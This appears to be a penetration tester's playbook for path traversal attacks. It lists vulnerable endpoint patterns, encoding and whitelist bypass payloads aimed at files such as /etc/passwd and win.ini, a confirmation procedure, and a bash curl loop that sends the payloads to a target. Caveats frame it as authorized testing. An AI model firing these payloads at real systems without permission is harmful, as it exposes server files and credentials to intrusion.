# Path traversal — playbook

## when to try
- File-download/preview endpoints: `?file=`, `?path=`, `?doc=`, `?image=`,
  `?include=`, `?template=`, `?page=`.
- Avatar / report / invoice download URLs that take a filename or ID.
- Static-asset proxies behind a URL-rewrite layer.
- ZIP/TAR upload+extract features (zip-slip).

## key bypass tricks
- Classic: `../../../etc/passwd`, `..\..\..\windows\win.ini`.
- URL-encode: `%2e%2e%2f`, double `%252e%252e%252f`, mixed `..%2f`, `%c0%ae` (overlong UTF-8 — IIS).
- Null byte: `?file=secret.txt%00.pdf` (older PHP/Java < 7).
- Absolute path: `?file=/etc/passwd` if leading slash isn't normalized.
- Whitelist bypass: `images/../../../etc/passwd`, `valid.png/../etc/passwd`,
  `valid.png?../etc/passwd` (some apps validate by suffix only).
- Windows shorts: `~1` short names (`progra~1`).
- `.;jsessionid=`, `;` parameter pollution (Tomcat).

## confirmation flow
1. Submit a known-valid filename — capture response.
2. Submit `..` traversal → look for content of `/etc/passwd`/`/etc/hostname`/`win.ini`. Even a few bytes leak = confirmed.
3. If 4xx, try variant encodings (above) one at a time.
4. If only filenames within a fixed dir are accepted, try Java/Spring `..%2f` over the whitelist.

## exploitation snippet
```bash
for p in '../../../etc/passwd' '..%2f..%2f..%2fetc%2fpasswd' '....//....//....//etc/passwd' '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'; do
  echo "=== $p ==="
  curl -sk "https://t/download?file=$p" | head -3
done
```

## caveats
- Don't try `/etc/shadow` — proves nothing more, escalates severity weirdly.
- ZIP-slip exploitation may write outside extraction dir → potential RCE; report carefully and don't actually overwrite system files.

## provenance
PortSwigger Path Traversal labs. CVE-2021-41773 (Apache 2.4.49).
